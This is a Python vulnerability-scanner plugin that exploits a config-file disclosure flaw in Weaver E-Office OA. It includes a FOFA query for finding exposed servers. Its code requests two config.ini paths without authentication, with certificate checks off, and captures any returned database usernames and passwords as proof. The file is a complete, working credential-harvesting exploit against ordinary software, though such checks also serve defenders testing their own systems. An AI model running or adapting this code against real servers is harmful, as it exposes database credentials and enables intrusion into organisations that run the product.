#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/VuTFss9RDkZhOxLbSlyUTw',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '泛微OA E Office config接口信息泄露',

      'level'     :   'medium',

      'FOFA'      :   'app="泛微-EOffice"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/4/8',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target1 = '/building/config/config.ini'
  target2 = '/building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini'
  url1 = url + target1
  url2 = url + target2
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=10,verify=False)
    if res.status_code == 200 and 'imoatosms' in res.text and re.search(r'building.*?user.*?password',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    pass

  try:
    res=requests.get(url=url2,headers=headers,timeout=10,verify=False)
    if res.status_code == 200 and re.search(r'sport.*?sdbbase.*?sdbpassword.*?sdbtable',res.text,re.S):
      ret['url'] = url2
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret